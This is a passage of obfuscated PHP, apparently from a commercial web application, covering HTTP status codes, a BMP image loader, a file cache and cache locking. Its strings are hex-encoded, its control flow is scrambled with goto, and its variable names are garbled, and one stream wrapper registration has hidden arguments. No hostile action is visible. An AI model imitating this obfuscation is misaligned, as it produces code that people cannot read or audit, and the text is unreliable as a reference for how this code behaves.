"\64\60\71" => "\103\157\156\146\x6c\x69\143\164", "\x34\61\x30" => "\x47\x6f\x6e\145", "\x34\x31\x31" => "\114\x65\156\x67\164\x68\x20\122\x65\161\x75\151\x72\x65\144", "\64\61\62" => "\x50\162\x65\143\x6f\x6e\x64\x69\x74\x69\x6f\x6e\40\106\x61\151\154\x65\144", "\x34\61\63" => "\x52\145\161\165\x65\x73\x74\x20\x45\x6e\x74\151\164\171\x20\124\x6f\157\40\x4c\141\x72\147\145", "\64\x31\x34" => "\122\145\161\165\x65\x73\x74\x20\125\x52\111\40\124\157\157\x20\114\x61\x72\x67\x65", "\x34\61\65" => "\x55\x6e\x73\x75\160\x70\x6f\162\164\x65\x64\40\x4d\x65\x64\x69\x61\40\124\171\x70\145", "\64\61\66" => "\122\145\161\165\x65\x73\x74\145\x64\x20\122\141\x6e\x67\145\40\x4e\x6f\x74\x20\123\x61\x74\151\163\146\151\x61\142\154\145", "\64\x31\67" => "\x45\x78\x70\145\143\x74\141\x74\151\157\x6e\x20\x46\141\151\x6c\145\144", "\64\62\x32" => "\125\156\160\162\x6f\143\x65\163\x73\141\142\154\x65\x20\105\156\x74\x69\x74\171", "\x34\62\x33" => "\114\x6f\143\153\145\144", "\64\x32\64" => "\106\141\x69\154\145\x64\x20\104\145\160\145\156\x64\x65\x6e\x63\x79", "\x34\62\65" => "\x55\x6e\157\162\144\x65\x72\145\x64\40\x43\157\x6c\x6c\x65\x63\164\151\x6f\x6e", "\64\x32\66" => "\x55\x70\x67\x72\141\x64\x65\40\122\x65\x71\x75\151\x72\x65\144", "\x34\62\x38" => "\120\x72\145\143\157\x6e\144\x69\x74\151\157\x6e\40\122\145\x71\165\x69\162\145\144", "\x34\62\x39" => "\x54\157\157\x20\115\141\x6e\171\40\122\x65\161\165\x65\x73\164\x73", "\64\x33\61" => "\x52\145\x71\165\x65\x73\x74\40\x48\x65\141\x64\145\x72\x20\106\x69\145\x6c\144\163\x20\x54\157\x6f\x20\114\x61\162\147\145", "\64\x34\x34" => "\x4e\157\40\122\145\x73\160\157\156\x73\x65", "\64\x35\x30" => "\102\x6c\x6f\143\153\145\x64\40\142\x79\40\x57\151\x6e\x64\x6f\x77\x73\40\x50\141\x72\145\156\164\141\154\x20\x43\157\x6e\x74\x72\x6f\154\163", "\64\x35\61" => "\x55\x6e\141\166\141\x69\154\x61\142\154\145\40\x46\157\x72\40\114\x65\147\x61\154\40\x52\x65\141\x73\x6f\156\x73", "\x34\71\64" => "\122\145\x71\165\x65\163\164\x20\110\x65\141\144\x65\162\x20\x54\157\157\x20\114\x61\x72\147\145", "\x35\x30\60" => "\111\156\164\145\x72\156\x61\x6c\x20\123\x65\162\x76\x65\x72\x20\105\x72\162\x6f\x72", "\65\60\61" => "\x4e\x6f\164\x20\x49\155\160\154\145\x6d\x65\156\164\145\144", "\65\x30\x32" => "\102\x61\144\x20\x47\x61\x74\x65\x77\141\x79", "\x35\x30\63" => "\123\x65\x72\166\x69\x63\145\x20\125\x6e\x61\166\141\151\x6c\x61\142\x6c\x65", "\x35\60\x34" => "\107\x61\x74\x65\167\x61\171\40\124\151\x6d\145\157\165\x74", "\x35\x30\65" => "\x48\x54\x54\x50\40\x56\x65\x72\163\x69\x6f\156\40\156\157\x74\40\163\x75\x70\x70\x6f\x72\x74\145\x64", "\65\x30\67" => "\111\156\163\x75\x66\146\x69\143\x69\145\156\164\x20\x53\x74\157\162\x61\147\x65"); public static function code($D‘åøáÎ•©) { $D×çéÙ¥‰È =& $_SERVER[ºÖÙÂŒäÉê‡]; $D‘åøáÎ•© = $D‘åøáÎ•© . $D×çéÙ¥‰È[33]; $A‚ÙÕ‹áÕŠ = self::$statusCode[$D‘åøáÎ•©]; $A‚ÙÕ‹áÕŠ = $A‚ÙÕ‹áÕŠ ? "\x48\x54\x54\120\57\61\x2e\61\x20{$D‘åøáÎ•©}\40" . $A‚ÙÕ‹áÕŠ : $D×çéÙ¥‰È[33]; return $A‚ÙÕ‹áÕŠ; } } class ImageGdBMP { public static function load($A»É²¡Ú±Ø) { $f—“›ÙÎß› = fopen($A»É²¡Ú±Ø, $_SERVER[ºÖÙÂŒäÉê‡][1482]); if ($f—“›ÙÎß› === !1) { return !1; } $Eá…ÚèÔ°„ = self::loadFromStream($f—“›ÙÎß›); fclose($f—“›ÙÎß›); return $Eá…ÚèÔ°„; } public static function loadFromStream($FøŸ³Œ‚×ë) { $e´–ÃÄŒğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¦ÒŒ“¡— = fread($FøŸ³Œ‚×ë, 14); if ($E¦ÒŒ“¡— === !1) { return !1; } if ($E¦ÒŒ“¡—[0] != $e´–ÃÄŒğ[1794] || $E¦ÒŒ“¡—[1] != $e´–ÃÄŒğ[1795]) { return !1; } $BğäÀĞñ° = unpack($e´–ÃÄŒğ[1796] . $e´–ÃÄŒğ[1797] . $e´–ÃÄŒğ[1798] . $e´–ÃÄŒğ[1799] . $e´–ÃÄŒğ[1800], $E¦ÒŒ“¡—); return self::loadFromStreamAndFileHeader($FøŸ³Œ‚×ë, $BğäÀĞñ°); } public static function loadFromStreamAndFileHeader($B½ˆÄí‡Ğ›, array $e–‹æ´àó“) { goto A›†ô ”Æù; FŒ±»ø¼ğÓ: if ($f¡Š¿¸ñˆâ == 1 || $f¡Š¿¸ñˆâ == 4 || $f¡Š¿¸ñˆâ == 8) { goto fÌ³òÄÌÒ; E¿Òà‰´Â¥: $bÉâĞ£Ü² = (1 << $f¡Š¿¸ñˆâ) - 1 << $DªêË°¾©; if ($D‡©Ë”“¬° == 1 || $D‡©Ë”“¬° == 2) { $Bç¢Û÷¦ = 0; $CŠ—’Ë¹² = $f¡Š¿¸ñˆâ >> 2 & 1; for (;;) { if ($Bç¢Û÷¦ < -1 || $Bç¢Û÷¦ > $cÂßÄÖ¿á || $dé¸Î§‰×à < -1 || $dé¸Î§‰×à > $aÙŞ¥ìàÓ) { imagedestroy($Dä‰ç‹‹¯›); return !1; } $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, 1); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } switch ($F…¢ªÃÇË) { case $F¾ÆŒ‚£[1819]: $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, 1); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } switch ($F…¢ªÃÇË) { case $F¾ÆŒ‚£[1819]: $dé¸Î§‰×à += $Déî…‡ä¥ñ; $Bç¢Û÷¦ = 0; break; case $F¾ÆŒ‚£[1821]: $dé¸Î§‰×à = 0; $Bç¢Û÷¦ = 0; break 3; case $F¾ÆŒ‚£[1822]: $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, 2); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } list(, $A¥èºÎÍÉĞ, $F“Ğ›¢”ó¹) = unpack($F¾ÆŒ‚£[1823], $F…¢ªÃÇË); $Bç¢Û÷¦ += $A¥èºÎÍÉĞ; $dé¸Î§‰×à += $F“Ğ›¢”ó¹ * $Déî…‡ä¥ñ; break; default: list(, $CÍ›‡¬‚ÁÁ) = unpack($F¾ÆŒ‚£[1824], $F…¢ªÃÇË); $B‰Æ°Ï•‰Î = ($CÍ›‡¬‚ÁÁ >> $CŠ—’Ë¹²) + ($CÍ›‡¬‚ÁÁ & $CŠ—’Ë¹²); $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $B‰Æ°Ï•‰Î + 1 & ~1); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } for ($A¸î‚ÚÁÑ = 0, $a­³È’Ø» = 0; $A¸î‚ÚÁÑ < $CÍ›‡¬‚ÁÁ; ++$A¸î‚ÚÁÑ, ++$Bç¢Û÷¦, $a­³È’Ø» += $f¡Š¿¸ñˆâ) { list(, $dÒ×¶ÖùêÒ) = unpack($F¾ÆŒ‚£[1824], $F…¢ªÃÇË[$a­³È’Ø» >> 3]); $aã³ÕÜ†Û‡ = $a­³È’Ø» & 7; imagesetpixel($Dä‰ç‹‹¯›, $Bç¢Û÷¦, $dé¸Î§‰×à, $bÚğó—‰Úê[($dÒ×¶ÖùêÒ & $bÉâĞ£Ü² >> $aã³ÕÜ†Û‡) >> $DªêË°¾© - $aã³ÕÜ†Û‡]); } break; } break; default: $FÖöğ³õ¥¤ = fread($B½ˆÄí‡Ğ›, 1); if ($FÖöğ³õ¥¤ === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } list(, $dìĞ’ÖáÌ, $dÒ×¶ÖùêÒ) = unpack($F¾ÆŒ‚£[1823], $F…¢ªÃÇË . $FÖöğ³õ¥¤); for ($A¸î‚ÚÁÑ = 0, $a­³È’Ø» = 0; $A¸î‚ÚÁÑ < $dìĞ’ÖáÌ; ++$A¸î‚ÚÁÑ, ++$Bç¢Û÷¦, $a­³È’Ø» += $f¡Š¿¸ñˆâ) { $aã³ÕÜ†Û‡ = $a­³È’Ø» & 7; imagesetpixel($Dä‰ç‹‹¯›, $Bç¢Û÷¦, $dé¸Î§‰×à, $bÚğó—‰Úê[($dÒ×¶ÖùêÒ & $bÉâĞ£Ü² >> $aã³ÕÜ†Û‡) >> $DªêË°¾© - $aã³ÕÜ†Û‡]); } break; } } } else { for ($D¢Ÿ…¢¨„Ø = 0; $D¢Ÿ…¢¨„Ø < $EŠ¯ï­ÛÍÖ; ++$D¢Ÿ…¢¨„Ø, $dé¸Î§‰×à += $Déî…‡ä¥ñ) { $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $EÁËÜ­ºà·); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } $a­³È’Ø» = 0; for ($Bç¢Û÷¦ = 0; $Bç¢Û÷¦ < $cÂßÄÖ¿á; ++$Bç¢Û÷¦, $a­³È’Ø» += $f¡Š¿¸ñˆâ) { list(, $dÒ×¶ÖùêÒ) = unpack($F¾ÆŒ‚£[1824], $F…¢ªÃÇË[$a­³È’Ø» >> 3]); $aã³ÕÜ†Û‡ = $a­³È’Ø» & 7; imagesetpixel($Dä‰ç‹‹¯›, $Bç¢Û÷¦, $dé¸Î§‰×à, $bÚğó—‰Úê[($dÒ×¶ÖùêÒ & $bÉâĞ£Ü² >> $aã³ÕÜ†Û‡) >> $DªêË°¾© - $aã³ÕÜ†Û‡]); } } } goto fî¹œÅĞ¹; d… ã„…™³: $bÚğó—‰Úê = array(); for ($A¸î‚ÚÁÑ = 0; $A¸î‚ÚÁÑ < $BæÂ„Í¹Ó; ++$A¸î‚ÚÁÑ) { $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $AïŒ’©òã); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } extract(unpack($F¾ÆŒ‚£[1820], $F…¢ªÃÇË . $F¾ÆŒ‚£[1819])); $bÚğó—‰Úê[] = imagecolorallocate($Dä‰ç‹‹¯›, $fŠœ‹é›âË, $F™­–Õ˜™—, $aã³ÕÜ†Û‡); } $DªêË°¾© = 8 - $f¡Š¿¸ñˆâ; goto E¿Òà‰´Â¥; fÌ³òÄÌÒ: $Dä‰ç‹‹¯› = imagecreate($cÂßÄÖ¿á, $EŠ¯ï­ÛÍÖ); $AïŒ’©òã = $DëÁ¼‰îƒõ == 12 ? 3 : 4; $BæÂ„Í¹Ó = $C•¦½÷‹Î ? $C•¦½÷‹Î : pow(2, $f¡Š¿¸ñˆâ); goto d… ã„…™³; fî¹œÅĞ¹: } else { goto e­‘æ¾å¤¸; a÷Á†õŠƒ¸: $FÚ¨›·ºØ­ = $f¡Š¿¸ñˆâ >> 3; $aŸ„‰†ßàÀ = $eË¾…Æ“«œ ? 127 : 0; $E¡Ïùã–«£ = $eË¾…Æ“«œ ? 1 / $eË¾…Æ“«œ : 1; goto C®·êŠ§ª; C®·êŠ§ª: $A¾íùğè  = $dÁŞ¢‰ê© ? 1 / $dÁŞ¢‰ê© : 1; $bÀÚòæåÂ = $F‘®¢¼ ? 1 / $F‘®¢¼ : 1; $D–¨ÕÃ†— = $d‹¨šö®›’ ? 1 / $d‹¨šö®›’ : 1; goto fæÄØÂÑà‡; fæÄØÂÑà‡: for ($D¢Ÿ…¢¨„Ø = 0; $D¢Ÿ…¢¨„Ø < $EŠ¯ï­ÛÍÖ; ++$D¢Ÿ…¢¨„Ø, $dé¸Î§‰×à += $Déî…‡ä¥ñ) { $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $EÁËÜ­ºà·); if ($F…¢ªÃÇË === !1) { imagedestroy($Dä‰ç‹‹¯›); return !1; } $a­³È’Ø» = 0; for ($Bç¢Û÷¦ = 0; $Bç¢Û÷¦ < $cÂßÄÖ¿á; ++$Bç¢Û÷¦, $a­³È’Ø» += $FÚ¨›·ºØ­) { list(, $dÒ×¶ÖùêÒ) = unpack($F¾ÆŒ‚£[1801], substr($F…¢ªÃÇË, $a­³È’Ø», $FÚ¨›·ºØ­) . $F¾ÆŒ‚£[1825]); $F¯’‚µÑ‘ñ = $dÒ×¶ÖùêÒ & $eË¾…Æ“«œ; $fæÒÎÎ²Ãè = $dÒ×¶ÖùêÒ & $dÁŞ¢‰ê©; $B¨äí§ùªÔ = $dÒ×¶ÖùêÒ & $F‘®¢¼; $cš‚ŒçÂˆÀ = $dÒ×¶ÖùêÒ & $d‹¨šö®›’; $BÃ¸òºÒß = $aŸ„‰†ßàÀ - (($F¯’‚µÑ‘ñ << 7) - $F¯’‚µÑ‘ñ) * $E¡Ïùã–«£; $fŠœ‹é›âË = (($fæÒÎÎ²Ãè << 8) - $fæÒÎÎ²Ãè) * $A¾íùğè ; $F™­–Õ˜™— = (($B¨äí§ùªÔ << 8) - $B¨äí§ùªÔ) * $bÀÚòæåÂ; $aã³ÕÜ†Û‡ = (($cš‚ŒçÂˆÀ << 8) - $cš‚ŒçÂˆÀ) * $D–¨ÕÃ†—; imagesetpixel($Dä‰ç‹‹¯›, $Bç¢Û÷¦, $dé¸Î§‰×à, $BÃ¸òºÒß << 24 | $fŠœ‹é›âË << 16 | $F™­–Õ˜™— << 8 | $aã³ÕÜ†Û‡); } } imagealphablending($Dä‰ç‹‹¯›, !0); goto D¸êãíÛ© ; e­‘æ¾å¤¸: $Dä‰ç‹‹¯› = imagecreatetruecolor($cÂßÄÖ¿á, $EŠ¯ï­ÛÍÖ); imagealphablending($Dä‰ç‹‹¯›, !1); if ($eË¾…Æ“«œ) { imagesavealpha($Dä‰ç‹‹¯›, !0); } goto a÷Á†õŠƒ¸; D¸êãíÛ© : } return $Dä‰ç‹‹¯›; goto aö‰…Û˜íÉ; A›†ô ”Æù: $F¾ÆŒ‚£ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($e–‹æ´àó“[$F¾ÆŒ‚£[393]] != 19778) { return !1; } $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, 4); goto C¬ß’«»²•; C¬ß’«»²•: if ($F…¢ªÃÇË === !1) { return !1; } list(, $DëÁ¼‰îƒõ) = unpack($F¾ÆŒ‚£[1801], $F…¢ªÃÇË); if ($DëÁ¼‰îƒõ == 12) { goto Eì©é¾½Ö; f£ÃÔÈ˜«´: $C•¦½÷‹Î = $C‹İø‹«Ñ¨ = $eË¾…Æ“«œ = $D‡©Ë”“¬° = 0; $dÁŞ¢‰ê© = 16711680; $F‘®¢¼ = 65280; goto eÅé­ßÚ; eÅé­ßÚ: $d‹¨šö®›’ = 255; goto cÒö¦…´àÇ; Eì©é¾½Ö: $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $DëÁ¼‰îƒõ - 4); if ($F…¢ªÃÇË === !1) { return !1; } extract(unpack($F¾ÆŒ‚£[1802] . $F¾ÆŒ‚£[1803] . $F¾ÆŒ‚£[1804] . $F¾ÆŒ‚£[1805], $F…¢ªÃÇË)); goto f£ÃÔÈ˜«´; cÒö¦…´àÇ: } else { if (124 < $DëÁ¼‰îƒõ || $DëÁ¼‰îƒõ < 40) { return !1; } else { goto B»ßÈ£ĞÉé; aù¿õ„‘Ê’: if ($cÂßÄÖ¿á & 2147483648) { $cÂßÄÖ¿á = -(~$cÂßÄÖ¿á & 4294967295) - 1; } if ($aÙŞ¥ìàÓ & 2147483648) { $aÙŞ¥ìàÓ = -(~$aÙŞ¥ìàÓ & 4294967295) - 1; } if ($Cƒç‰°ëºĞ & 2147483648) { $Cƒç‰°ëºĞ = -(~$Cƒç‰°ëºĞ & 4294967295) - 1; } goto AÆ¦‡Î×‚Á; B»ßÈ£ĞÉé: $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, 36); if ($F…¢ªÃÇË === !1) { return !1; } extract(unpack($F¾ÆŒ‚£[1806] . $F¾ÆŒ‚£[1807] . $F¾ÆŒ‚£[1804] . $F¾ÆŒ‚£[1808] . $F¾ÆŒ‚£[1809] . $F¾ÆŒ‚£[1810] . $F¾ÆŒ‚£[1811] . $F¾ÆŒ‚£[1812] . $F¾ÆŒ‚£[1813] . $F¾ÆŒ‚£[1814], $F…¢ªÃÇË)); goto aù¿õ„‘Ê’; C ²Á¸ëî¼: if (($f¡Š¿¸ñˆâ == 16 || $f¡Š¿¸ñˆâ == 24 || $f¡Š¿¸ñˆâ == 32) && $D‡©Ë”“¬° == 0 && $dÁŞ¢‰ê© == 0 && $F‘®¢¼ == 0 && $d‹¨šö®›’ == 0) { switch ($f¡Š¿¸ñˆâ) { case 16: $dÁŞ¢‰ê© = 31744; $F‘®¢¼ = 992; $d‹¨šö®›’ = 31; break; case 24: case 32: $dÁŞ¢‰ê© = 16711680; $F‘®¢¼ = 65280; $d‹¨šö®›’ = 255; break; } } goto Bµ•¸êÂÆß; AÆ¦‡Î×‚Á: if ($bõ·ÎñÉ & 2147483648) { $bõ·ÎñÉ = -(~$bõ·ÎñÉ & 4294967295) - 1; } if ($e–‹æ´àó“[$F¾ÆŒ‚£[524]] != 0) { $D¶‡ÖøñÂÔ = $f¡Š¿¸ñˆâ == 1 || $f¡Š¿¸ñˆâ == 4 || $f¡Š¿¸ñˆâ == 8 ? ($C•¦½÷‹Î ? $C•¦½÷‹Î : pow(2, $f¡Š¿¸ñˆâ)) << 2 : 0; $D…šÚƒØ°â = $f±†®¢š§ ? $f±†®¢š§ : ($cÂßÄÖ¿á * $f¡Š¿¸ñˆâ + 31 >> 3 & ~3) * abs($aÙŞ¥ìàÓ); $A«òòã„Ëº = $e–‹æ´àó“[$F¾ÆŒ‚£[524]] - $D…šÚƒØ°â - $D¶‡ÖøñÂÔ - 14; if ($DëÁ¼‰îƒõ < $A«òòã„Ëº && 40 <= $DëÁ¼‰îƒõ && $DëÁ¼‰îƒõ <= 124) { $DëÁ¼‰îƒõ = $A«òòã„Ëº; } } if ($DëÁ¼‰îƒõ - 40 > 0) { $F…¢ªÃÇË = fread($B½ˆÄí‡Ğ›, $DëÁ¼‰îƒõ - 40); if ($F…¢ªÃÇË === !1) { return !1; } extract(unpack($F¾ÆŒ‚£[1815] . $F¾ÆŒ‚£[1816] . $F¾ÆŒ‚£[1817] . $F¾ÆŒ‚£[1818], $F…¢ªÃÇË . str_repeat($F¾ÆŒ‚£[1819], 120))); } else { $eË¾…Æ“«œ = $dÁŞ¢‰ê© = $F‘®¢¼ = $d‹¨šö®›’ = 0; } goto C ²Á¸ëî¼; Bµ•¸êÂÆß: } } goto FŸù¦õğ™À; FŸù¦õğ™À: if ($cÂßÄÖ¿á == 0 || $aÙŞ¥ìàÓ == 0 || $Bƒñ¤ÂÒîÄ != 1 || ($eË¾…Æ“«œ & $dÁŞ¢‰ê©) != 0 || ($eË¾…Æ“«œ & $F‘®¢¼) != 0 || ($eË¾…Æ“«œ & $d‹¨šö®›’) != 0 || ($dÁŞ¢‰ê© & $F‘®¢¼) != 0 || ($dÁŞ¢‰ê© & $d‹¨šö®›’) != 0 || ($F‘®¢¼ & $d‹¨šö®›’) != 0) { return !1; } if ($D‡©Ë”“¬° == 4 || $D‡©Ë”“¬° == 5) { $F…¢ªÃÇË = stream_get_contents($B½ˆÄí‡Ğ›, $f±†®¢š§); if ($F…¢ªÃÇË === !1) { return !1; } return imagecreatefromstring($F…¢ªÃÇË); } $EÁËÜ­ºà· = $cÂßÄÖ¿á * $f¡Š¿¸ñˆâ + 31 >> 3 & ~3; goto A¦¤ˆ¬ÇÁÍ; A¦¤ˆ¬ÇÁÍ: $EŠ¯ï­ÛÍÖ = abs($aÙŞ¥ìàÓ); $dé¸Î§‰×à = $aÙŞ¥ìàÓ > 0 ? $EŠ¯ï­ÛÍÖ - 1 : 0; $Déî…‡ä¥ñ = $aÙŞ¥ìàÓ > 0 ? -1 : 1; goto FŒ±»ø¼ğÓ; aö‰…Û˜íÉ: } } goto FêåÏõÏÜé; dªôŒ³Îİ¤: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($AÔÒ¢é¯ƒ­, $aÒÛÛ´¥™¼) { $D”‘¹ªˆ¸Â =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->cachePath = $AÔÒ¢é¯ƒ­[$D”‘¹ªˆ¸Â[75]]; $this->prefix = $D”‘¹ªˆ¸Â[759]; $this->cacheTime = $aÒÛÛ´¥™¼; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($C¯íÇÕ’“¯) { $F¤³Å»¢‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¯íÇÕ’“¯ = str_replace(array($F¤³Å»¢‚[760], $F¤³Å»¢‚[93], $F¤³Å»¢‚[69]), $F¤³Å»¢‚[761], $C¯íÇÕ’“¯); return $this->cachePath . $F¤³Å»¢‚[762] . $C¯íÇÕ’“¯ . $F¤³Å»¢‚[763]; } public function set($eªÅ½ÔƒÒ…, $f†Ã…¶¥‘—, $D³±†’Ÿ«· = false) { $DÅ¬¼÷…ºÆ = $this->getFile($eªÅ½ÔƒÒ…); if (file_put_contents($DÅ¬¼÷…ºÆ, $this->prefix . $f†Ã…¶¥‘—, LOCK_EX)) { return !0; } @unlink($DÅ¬¼÷…ºÆ); return !1; } public function get($C¿Á„öÆÎÓ) { $b¢¦Äµ–¤ = $this->getFile($C¿Á„öÆÎÓ); if (file_exists($b¢¦Äµ–¤) && filemtime($b¢¦Äµ–¤) < time() - $this->cacheTime) { @unlink($b¢¦Äµ–¤); return !1; } $f™°îğƒ‚Û = @file_get_contents($b¢¦Äµ–¤); return substr($f™°îğƒ‚Û, strlen($this->prefix)); } public function remove($a™¯½’¬»¥) { $EÄÔÑòŞº­ = $this->getFile($a™¯½’¬»¥); return @unlink($EÄÔÑòŞº­); } public function deleteAll() { $Dî÷èö =& $_SERVER[ºÖÙÂŒäÉê‡]; $fº³È÷Å•‰ = scandir($this->cachePath); foreach ($fº³È÷Å•‰ as $F®¦ŒãƒÈ¯) { $AƒÕà¼°Œ° = $this->cachePath . $F®¦ŒãƒÈ¯; if (strpos($AƒÕà¼°Œ°, $Dî÷èö[763]) && strpos($AƒÕà¼°Œ°, $Dî÷èö[764])) { @unlink($AƒÕà¼°Œ°); } } } public function clearTimeout() { $EÔœÑ¶éİğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fØà”¡ßŸ‚ = scandir($this->cachePath); foreach ($fØà”¡ßŸ‚ as $eÅìİª§) { $BÀ·ÉÚ“½Ï = $this->cachePath . $eÅìİª§; if (strpos($BÀ·ÉÚ“½Ï, $EÔœÑ¶éİğ[763]) && strpos($BÀ·ÉÚ“½Ï, $EÔœÑ¶éİğ[764]) && filemtime($BÀ·ÉÚ“½Ï) < time() - $this->cacheTime) { @unlink($BÀ·ÉÚ“½Ï); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto b´»ß¡ÂÊ; C³¿ôÍ‡–: self::$timeout = $Bì¯ïğÖÒà[$A£òõÚÛ¨[765]] ? $Bì¯ïğÖÒà[$A£òõÚÛ¨[765]] : 10; $D™åÊ£ÔÒ® = _get($GLOBALS[$A£òõÚÛ¨[6]], $A£òõÚÛ¨[766]); $Cæ„¢¥‹›ã = $Bì¯ïğÖÒà[$A£òõÚÛ¨[752]] ? $Bì¯ïğÖÒà[$A£òõÚÛ¨[752]] : $A£òõÚÛ¨[163]; goto Cçäƒİ¨’; b´»ß¡ÂÊ: $A£òõÚÛ¨ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (self::$handle) { return self::$handle; } $Bì¯ïğÖÒà = $GLOBALS[$A£òõÚÛ¨[6]][$A£òõÚÛ¨[342]]; goto C³¿ôÍ‡–; Cçäƒİ¨’: if ($Cæ„¢¥‹›ã == $A£òõÚÛ¨[17] && $D™åÊ£ÔÒ® == $A£òõÚÛ¨[9]) { $Cæ„¢¥‹›ã = $A£òõÚÛ¨[163]; } switch ($Cæ„¢¥‹›ã) { case $A£òõÚÛ¨[755]: self::$handle = new CacheLockRedis(); break; case $A£òõÚÛ¨[756]: self::$handle = new CacheLockMemcached(); break; case $A£òõÚÛ¨[17]: self::$handle = new CacheLockDatabase(); break; case $A£òõÚÛ¨[163]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e¬ËÚ¢·Öó; e¬ËÚ¢·Öó: } private static function key($EåÀ‚·Ÿ†‚) { return $_SERVER[ºÖÙÂŒäÉê‡][767] . Cache::key($EåÀ‚·Ÿ†‚); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($D“¸¿ôŞéƒ = '') { self::$errorMsg = $D“¸¿ôŞéƒ; } public static function lockGlobal($EØâ’ÇìØğ, $fµÈÒóĞ) { return self::lock($EØâ’ÇìØğ, $fµÈÒóĞ, !0); } public static function lock($Bè‚¥ÚÙô÷, $aÓ¡åë¥ = false, $fÒªÄÄ”¢Ú = false) { goto Aé©­¥¢”õ; C¨æÈ¼ÍŞ: if (!$fÒªÄÄ”¢Ú) { self::$lockItem[$f²¢”ÈÀÉŸ] = !0; } return $B±´ªêÆù; goto fÏê’æå–; bâï÷Æ¬½´: $aÓ¡åë¥ = $aÓ¡åë¥ ? $aÓ¡åë¥ : self::$timeout; $B±´ªêÆù = $b‚ãİé…Ï->lock($f²¢”ÈÀÉŸ, $aÓ¡åë¥); if (!$B±´ªêÆù) { $C£†‘‰ç‚Ğ = $fÆÆÇå«éö[768] . $aÓ¡åë¥ . $fÆÆÇå«éö[67] . self::$errorMsg . $fÆÆÇå«éö[67] . get_caller_msg(); $fÈ¤•°‡ÎÇ = "\x4c\157\143\153\x20\x61\143\x74\x69\157\x6e\x3a\x20{$f²¢”ÈÀÉŸ}\40\164\151\x6d\x65\157\x75\x74\x2c\157\166\x65\x72\40{$aÓ¡åë¥}\x20\x73"; $fÈ¤•°‡ÎÇ = self::$errorMsg ? self::$errorMsg : $F¶¹ùê…®Ñ; write_log($C£†‘‰ç‚Ğ, $fÆÆÇå«éö[769]); show_json($fÈ¤•°‡ÎÇ, !1); } goto C¨æÈ¼ÍŞ; Aé©­¥¢”õ: $fÆÆÇå«éö =& $_SERVER[ºÖÙÂŒäÉê‡]; $b‚ãİé…Ï = self::init(); $f²¢”ÈÀÉŸ = self::key($Bè‚¥ÚÙô÷); goto bâï÷Æ¬½´; fÏê’æå–: } public static function lockGet($FùöÔ‚‹÷š) { $FÖ…‘ĞŠ›‚ = self::key($FùöÔ‚‹÷š); if (self::$lockItem[$FÖ…‘ĞŠ›‚]) { return self::$lockItem[$FÖ…‘ĞŠ›‚]; } return self::init()->lockGet($FÖ…‘ĞŠ›‚); } public static function unlock($CÆ±¥êÆ¼ñ) { $C†İ²Å˜Òæ = self::key($CÆ±¥êÆ¼ñ); self::$lockItem[$C†İ²Å˜Òæ] = null; return self::init()->unlock($C†İ²Å˜Òæ); } public static function unlockRuntime() { $F®Ğ´‡Æ³ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bö¸×Ê¿ïÉ = self::init(); $AÛğ…Á²¦‚ = !1; foreach (self::$lockItem as $Aƒã… ¹Á“ => $bÃóìä´¹–) { if (!$bÃóìä´¹–) { continue; } $bö¸×Ê¿ïÉ->unlock($Aƒã… ¹Á“); if (!$AÛğ…Á²¦‚) { $AÛğ…Á²¦‚ = !0; write_log($F®Ğ´‡Æ³[770] . $Aƒã… ¹Á“ . $F®Ğ´‡Æ³[67] . get_caller_msg(), $F®Ğ´‡Æ³[769]); continue; } write_log($F®Ğ´‡Æ³[770] . $Aƒã… ¹Á“, $F®Ğ´‡Æ³[769]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } goto eçˆËïß†î; Cè›Ã‘•: $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][52]] = ("\71\65\63\71"."\62\65")+0;$_tAsW="EvYgDzaKnMQK98SU2wBpM4iMmZHRIIYI2VwzbtQWXeg7GC9Wity8BPQdgFBxWPcTzVcCdHCbAn6jSbqFsv";; stream_wrapper_register($_SERVER[Ş†Ÿ·Ñ«”ÔÂ][53], $_SERVER[Ş†Ÿ·Ñ«”ÔÂ][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($FõÚâŒò„, $aï¯´‰Ë‹Ñ) { $E”•ğ†´ ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if (isset(self::$_methodList[$FõÚâŒò„])) { return @call_user_func_array(self::$_methodList[$FõÚâŒò„], $aï¯´‰Ë‹Ñ); } else { if (method_exists($this, $FõÚâŒò„)) { return call_user_func_array(array($this, $FõÚâŒò„), $aï¯´‰Ë‹Ñ); } else { think_exception(__CLASS__ . $E”•ğ†´ ã[4] . $FõÚâŒò„ . $E”•ğ†´ ã[5]); } } } public static function __callStatic($f„‰¾ë‡Í³, $c†ŸŠÀ•) { if 